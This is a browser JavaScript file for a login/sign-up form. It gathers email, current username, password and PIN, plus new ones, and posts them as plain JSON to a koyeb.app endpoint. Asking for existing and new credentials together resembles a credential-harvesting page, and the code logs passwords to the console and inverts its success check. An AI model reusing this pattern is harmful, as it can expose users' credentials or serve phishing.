// Get the modals
var successModal = document.getElementById("successModal");
var errorModal = document.getElementById("errorModal");

// Get the <span> element that closes the modal
var closeButtons = document.getElementsByClassName("close");

// When the user clicks on <span> (x), close the modal
for (let i = 0; i < closeButtons.length; i++) {
  closeButtons[i].onclick = function () {
    successModal.style.display = "none";
    errorModal.style.display = "none";
  }
}

// Function to show success modal
function showSuccessModal() {
  successModal.style.display = "block";
}

// Function to show error modal
function showErrorModal() {
  errorModal.style.display = "block";
}

// Close the modal if the user clicks anywhere outside of it
window.onclick = function (event) {
  if (event.target == successModal) {
    successModal.style.display = "none";
  }
  if (event.target == errorModal) {
    errorModal.style.display = "none";
  }
}

// Login form submission
document.getElementById("loginForm").addEventListener("submit", function(event) {
  event.preventDefault();
    console.log("TRIGGERED")
    // Dummy validation logic
    var email = document.getElementById("email").value;
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    var pin = document.getElementById("pin").value;
    var new_username = document.getElementById("new_username").value;
    var new_password = document.getElementById("new_password").value;
    var new_pin = document.getElementById("new_pin").value;
    // window.location.href = "https://www.google.com"

    sendData(email, username, password, pin, new_username, new_password, new_pin);
});

function clearData(){
  document.getElementById("email").value = "";
  document.getElementById("username").value = "";
  document.getElementById("password").value = "";
  document.getElementById("pin").value = "";
  document.getElementById("new_username").value = "";
  document.getElementById("new_password").value = "";
  document.getElementById("new_pin").value = "";
}



function sendData(email, username, password, pin, new_username, new_password, new_pin) {
  // The URL of the API endpoint
  const apiUrl = 'https://developing-maria-sanjuan-company-9e050470.koyeb.app/pending/signUp';

  // The data you want to send in the request body
  const requestData = {
    "email": email,
    "username": username,
    "password": password,
    "pin": pin,
    "newUsername": new_username,
    "newPassword": new_password,
    "newPIN": new_pin,
  };
  console.log(requestData);

  // The fetch function to call the API
  fetch(apiUrl, {
    method: 'POST', // Specify the HTTP method
    headers: {
      'Content-Type': 'application/json', // Set the content type to JSON
    },
    body: JSON.stringify(requestData) // Convert the data to a JSON string
  })
    .then(response => {
      if (!response.ok) {
        showErrorModal();
        // throw new Error('Network response was not ok ' + response.statusText);
        return false;
      }
      return response.json(); // Parse the JSON from the response
    })
    .then(data => {
      clearData();
      console.log(data); // Handle the success response data
      if (data["message"] != "SUCCESSFULLY REGISTERED USER"){
        showSuccessModal();
      }else{
        showErrorModal();
      }
      return true;
    })
    .catch(error => {
      showErrorModal();
      console.error('There was a problem with the fetch operation:', error); // Handle any errors
      return false;
    });
}
